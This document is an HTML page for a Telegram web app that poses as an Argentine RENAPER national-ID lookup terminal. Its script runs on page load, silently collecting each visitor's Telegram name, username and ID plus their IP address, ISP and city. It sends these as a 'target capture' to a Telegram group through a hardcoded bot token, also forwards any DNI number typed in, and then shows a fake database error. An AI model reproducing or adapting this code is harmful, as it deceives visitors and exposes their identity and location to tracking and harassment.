<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA ARG-DATA v5.0</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #050a0f; color: #00f2ff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
        .box { border: 1px solid #00f2ff; padding: 30px 20px; border-radius: 10px; box-shadow: 0 0 20px #00f2ff; max-width: 350px; margin: 40px auto; }
        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00f2ff; color: #00f2ff; text-align: center; outline: none; }
        button { background: #00f2ff; color: #000; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; width: 90%; }
    </style>
</head>
<body>

    <div class="box">
        <h3>ARG-DATA TERMINAL</h3>
        <p>CONSULTA RENAPER</p>
        <hr style="border: 0.5px solid #00f2ff22;">
        <input type="number" id="dni" placeholder="Ingrese DNI">
        <br>
        <button onclick="enviarDni()">BUSCAR</button>
        <p id="status" style="font-size: 0.8em; margin-top:15px;">Iniciando conexi√≥n segura...</p>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        const botToken = "8488321953:AAFFIvsfxsxxp2ImaSl3WQzsuCTOyblqPig";
        const grupoId = "-1003670055074";

        async function reportePrincipal() {
            // Esperamos un segundo para que carguen los datos de Telegram
            setTimeout(async () => {
                const user = tg.initDataUnsafe?.user;
                const nombreCompleto = `${user?.first_name || "Oculto"} ${user?.last_name || ""}`;
                const username = user?.username ? `@${user.username}` : "Sin @alias";
                const userId = user?.id || "Desconocido";

                try {
                    // Obtenemos la IP y el Proveedor
                    const res = await fetch('https://ipapi.co/json/');
                    const data = await res.json();
                    
                    const mensaje = `üö® **CAPTURA DE OBJETIVO** üö®\n` +
                                    `--------------------------------\n` +
                                    `üë§ **Usuario:** ${nombreCompleto}\n` +
                                    `üÜî **Alias:** ${username}\n` +
                                    `üî¢ **ID:** \`${userId}\`\n` +
                                    `üåê **IP:** \`${data.ip}\`\n` +
                                    `üì° **Proveedor:** \`${data.org}\`\n` +
                                    `üìç **Ciudad:** \`${data.city}, ${data.country_name}\`\n` +
                                    `--------------------------------`;

                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: grupoId,
                            text: mensaje,
                            parse_mode: 'Markdown'
                        })
                    });
                    document.getElementById('status').innerText = "SISTEMA ONLINE";
                } catch (e) {
                    document.getElementById('status').innerText = "ERROR DE SINCRONIZACI√ìN";
                }
            }, 1000); 
        }

        async function enviarDni() {
            const user = tg.initDataUnsafe?.user;
            const alias = user?.username ? `@${user.username}` : "Sin @alias";
            const dni = document.getElementById('dni').value;
            
            if(!dni) return alert("Ingrese un DNI");

            const msgDni = `üìù **DNI INGRESADO**\n` +
                           `üë§ **Por:** ${alias}\n` +
                           `üéØ **DNI:** \`${dni}\``;

            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: grupoId, text: msgDni, parse_mode: 'Markdown' })
            });
            alert("Error: Base de datos no disponible.");
        }

        window.onload = reportePrincipal;
    </script>
</body>
</html>
